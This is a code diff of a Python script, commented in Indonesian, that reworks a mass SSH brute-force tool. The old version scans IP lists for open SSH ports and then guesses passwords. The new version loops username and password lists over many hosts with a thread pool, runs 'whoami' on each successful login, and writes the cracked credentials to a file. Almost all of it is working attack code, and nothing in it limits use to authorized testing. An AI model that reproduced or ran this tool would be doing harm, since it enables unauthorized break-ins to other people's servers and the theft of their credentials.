@@ -1,238 +1,155 @@
 #!/usr/bin/python3
-# ssh_brute_auto.py - Auto detect SSH + Brute
+# ssh_brute.py - SSH Brute Force dengan IP list
 import paramiko
 import socket
 import sys
-import threading
-import queue
 import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
 
-print("""
-███████╗███████╗██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
-██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
-███████╗███████╗███████║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
-╚════██║╚════██║██╔══██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
-███████║███████║██║  ██║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
-╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
-""")
-
-class SSHScanner:
-    def __init__(self):
-        self.ssh_hosts = []
-        self.lock = threading.Lock()
-        self.queue = queue.Queue()
+class SSHBrute:
+    def __init__(self, ip_file, user_file, pass_file, threads=10, timeout=5):
+        self.ip_file = ip_file
+        self.user_file = user_file
+        self.pass_file = pass_file
+        self.threads = threads
+        self.timeout = timeout
+        self.results = []
+        self.found_creds = []
         
-    def check_ssh(self, ip, port=22, timeout=2):
-        """Check jika port SSH open"""
+    def load_file(self, filename):
+        """Load file ke list"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(timeout)
-            result = sock.connect_ex((ip, port))
-            sock.close()
-            
-            if result == 0:
-                # Coba baca banner SSH
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(timeout)
-                    sock.connect((ip, port))
-                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
-                    sock.close()
-                    
-                    if 'SSH' in banner or 'OpenSSH' in banner:
-                        with self.lock:
-                            self.ssh_hosts.append(ip)
-                        print(f"[+] SSH found: {ip}:{port} - {banner[:50]}")
-                        return True
-                except:
-                    pass
-        except:
-            pass
-        return False
+            with open(filename, 'r') as f:
+                return [line.strip() for line in f if line.strip()]
+        except FileNotFoundError:
+            print(f"[-] File {filename} tidak ditemukan!")
+            sys.exit(1)
     
-    def scan_ips(self, ip_file, threads=50):
-        """Scan IP list untuk SSH"""
-        print(f"[*] Loading IPs from {ip_file}")
-        with open(ip_file, 'r') as f:
-            ips = [line.strip() for line in f if line.strip()]
+    def try_ssh(self, ip, username, password):
+        """Coba login SSH"""
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         
-        print(f"[*] Scanning {len(ips)} IPs for SSH...")
-        
-        def worker():
-            while True:
-                try:
-                    ip = self.queue.get(timeout=1)
-                    self.check_ssh(ip)
-                    self.queue.task_done()
-                except queue.Empty:
-                    break
-        
-        # Masukkan semua IP ke queue
-        for ip in ips:
-            self.queue.put(ip)
-        
-        # Start threads
-        thread_list = []
-        for i in range(threads):
-            t = threading.Thread(target=worker)
-            t.daemon = True
-            t.start()
-            thread_list.append(t)
-        
-        # Tunggu sampai selesai
-        self.queue.join()
-        
-        print(f"\n[*] Found {len(self.ssh_hosts)} SSH hosts")
-        return self.ssh_hosts
-
-class SSHBruter:
-    def __init__(self):
-        self.found = []
-        self.tried = 0
-        self.lock = threading.Lock()
-        
-    def brute(self, ip, username, password, timeout=3):
-        """Brute force satu kombinasi"""
         try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh.connect(ip, 
                        username=username, 
                        password=password,
-                       timeout=timeout,
+                       timeout=self.timeout,
                        banner_timeout=10,
                        auth_timeout=10)
             
-            # Execute command untuk verifikasi
-            stdin, stdout, stderr = ssh.exec_command('id', timeout=2)
-            output = stdout.read().decode()
+            # Cek jika connection successful
+            stdin, stdout, stderr = ssh.exec_command('whoami', timeout=5)
+            output = stdout.read().decode().strip()
             
-            with self.lock:
-                self.found.append({
-                    'ip': ip,
-                    'user': username,
-                    'pass': password,
-                    'output': output[:100]
-                })
-            
-            ssh.close()
-            return True
+            return {
+                'status': 'SUCCESS',
+                'ip': ip,
+                'username': username,
+                'password': password,
+                'user': output
+            }
             
         except paramiko.AuthenticationException:
-            return False
-        except:
-            return False
+            return {'status': 'AUTH_FAILED', 'ip': ip, 'username': username}
+        except socket.timeout:
+            return {'status': 'TIMEOUT', 'ip': ip}
+        except paramiko.SSHException as e:
+            if 'Error reading SSH protocol banner' in str(e):
+                return {'status': 'BANNER_ERROR', 'ip': ip}
+            return {'status': 'SSH_ERROR', 'ip': ip, 'error': str(e)}
+        except Exception as e:
+            return {'status': 'ERROR', 'ip': ip, 'error': str(e)}
         finally:
-            with self.lock:
-                self.tried += 1
-                if self.tried % 100 == 0:
-                    print(f"[*] Tried: {self.tried} | Found: {len(self.found)}", end='\r')
+            try:
+                ssh.close()
+            except:
+                pass
     
-    def brute_host(self, ip, users, passes, threads=5):
-        """Brute force satu host"""
-        print(f"\n[*] Bruting {ip}")
+    def brute_ip(self, ip):
+        """Brute force untuk satu IP"""
+        print(f"[*] Testing {ip}")
         
-        # Buat queue untuk kombinasi
-        combo_queue = queue.Queue()
-        for user in users:
-            for pwd in passes:
-                combo_queue.put((user, pwd))
+        for username in self.usernames:
+            for password in self.passwords:
+                result = self.try_ssh(ip, username, password)
+                
+                if result['status'] == 'SUCCESS':
+                    print(f"\n[+] FOUND: {ip} | {username}:{password}")
+                    self.found_creds.append(result)
+                    return result
+                elif result['status'] == 'AUTH_FAILED':
+                    continue  # Coba password lain
+                else:
+                    # Error lainnya, skip IP ini
+                    if 'Connection refused' in str(result.get('error', '')):
+                        print(f"[-] {ip}: Connection refused")
+                        return None
+                    break  # Keluar dari loop untuk IP ini
         
-        def worker():
-            while True:
+        return None
+    
+    def run(self):
+        """Main execution"""
+        print("[*] Loading files...")
+        self.ips = self.load_file(self.ip_file)
+        self.usernames = self.load_file(self.user_file)
+        self.passwords = self.load_file(self.pass_file)
+        
+        print(f"[*] Loaded {len(self.ips)} IPs, {len(self.usernames)} users, {len(self.passwords)} passwords")
+        print(f"[*] Starting brute force with {self.threads} threads...\n")
+        
+        start_time = datetime.now()
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            # Submit semua task
+            future_to_ip = {executor.submit(self.brute_ip, ip): ip for ip in self.ips}
+            
+            # Process results
+            for future in as_completed(future_to_ip):
+                ip = future_to_ip[future]
                 try:
-                    user, pwd = combo_queue.get(timeout=1)
-                    if self.brute(ip, user, pwd):
-                        print(f"\n[+] FOUND: {ip} | {user}:{pwd}")
-                        # Hentikan brute untuk host ini
-                        while not combo_queue.empty():
-                            combo_queue.get()
-                            combo_queue.task_done()
-                    combo_queue.task_done()
-                except queue.Empty:
-                    break
+                    result = future.result(timeout=30)
+                    if result and result['status'] == 'SUCCESS':
+                        self.results.append(result)
+                except Exception as e:
+                    print(f"[-] Error processing {ip}: {e}")
         
-        # Start threads
-        thread_list = []
-        for i in range(threads):
-            t = threading.Thread(target=worker)
-            t.daemon = True
-            t.start()
-            thread_list.append(t)
+        end_time = datetime.now()
+        duration = end_time - start_time
         
-        # Tunggu selesai
-        combo_queue.join()
+        # Print summary
+        print("\n" + "="*50)
+        print("[*] SCAN COMPLETE")
+        print("="*50)
+        print(f"[*] Duration: {duration}")
+        print(f"[*] IPs tested: {len(self.ips)}")
+        print(f"[*] Credentials found: {len(self.found_creds)}")
         
-        return any([t.is_alive() for t in thread_list])
+        if self.found_creds:
+            print("\n[+] FOUND CREDENTIALS:")
+            for cred in self.found_creds:
+                print(f"    {cred['ip']} | {cred['username']}:{cred['password']} | User: {cred.get('user', 'N/A')}")
+            
+            # Save to file
+            with open('found_credentials.txt', 'w') as f:
+                for cred in self.found_creds:
+                    f.write(f"{cred['ip']}:22 {cred['username']}:{cred['password']}\n")
+            print(f"\n[*] Saved to: found_credentials.txt")
+        
+        return self.found_creds
 
-def main():
-    if len(sys.argv) < 2:
-        print("Usage: python3 ssh_brute_auto.py <ip_list.txt>")
-        print("Optional: -u users.txt -p passwords.txt -t threads")
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        print("Usage: python3 ssh_brute.py <ip_list.txt> <user_list.txt> <pass_list.txt> [threads]")
+        print("Example: python3 ssh_brute.py ips.txt users.txt passwords.txt 20")
         sys.exit(1)
     
     ip_file = sys.argv[1]
+    user_file = sys.argv[2]
+    pass_file = sys.argv[3]
+    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 10
     
-    # Default files
-    user_file = 'users.txt'
-    pass_file = 'passwords.txt'
-    threads = 10
-    
-    # Parse arguments
-    for i in range(2, len(sys.argv)):
-        if sys.argv[i] == '-u' and i+1 < len(sys.argv):
-            user_file = sys.argv[i+1]
-        elif sys.argv[i] == '-p' and i+1 < len(sys.argv):
-            pass_file = sys.argv[i+1]
-        elif sys.argv[i] == '-t' and i+1 < len(sys.argv):
-            threads = int(sys.argv[i+1])
-    
-    # Load user/pass files
-    print("[*] Loading credentials...")
-    with open(user_file, 'r') as f:
-        users = [line.strip() for line in f if line.strip()]
-    
-    with open(pass_file, 'r') as f:
-        passes = [line.strip() for line in f if line.strip()]
-    
-    print(f"[*] Users: {len(users)}, Passwords: {len(passes)}")
-    
-    # Step 1: Scan for SSH hosts
-    scanner = SSHScanner()
-    ssh_hosts = scanner.scan_ips(ip_file, threads=threads)
-    
-    if not ssh_hosts:
-        print("[-] No SSH hosts found!")
-        sys.exit(0)
-    
-    # Step 2: Brute force
-    print("\n" + "="*50)
-    print("[*] Starting brute force...")
-    print("="*50)
-    
-    bruter = SSHBruter()
-    
-    for ip in ssh_hosts:
-        bruter.brute_host(ip, users, passes, threads=5)
-        time.sleep(0.5)  # Delay antar host
-    
-    # Results
-    print("\n" + "="*50)
-    print("[*] BRUTE FORCE COMPLETE")
-    print("="*50)
-    print(f"[*] Total tried: {bruter.tried}")
-    print(f"[*] Credentials found: {len(bruter.found)}")
-    
-    if bruter.found:
-        print("\n[+] FOUND CREDENTIALS:")
-        for cred in bruter.found:
-            print(f"    {cred['ip']} | {cred['user']}:{cred['pass']}")
-        
-        # Save to file
-        with open('found.txt', 'w') as f:
-            for cred in bruter.found:
-                f.write(f"{cred['ip']} {cred['user']} {cred['pass']}\n")
-        print(f"\n[*] Saved to found.txt")
-
-if __name__ == "__main__":
-    main()
+    brute = SSHBrute(ip_file, user_file, pass_file, threads)
+    brute.run()
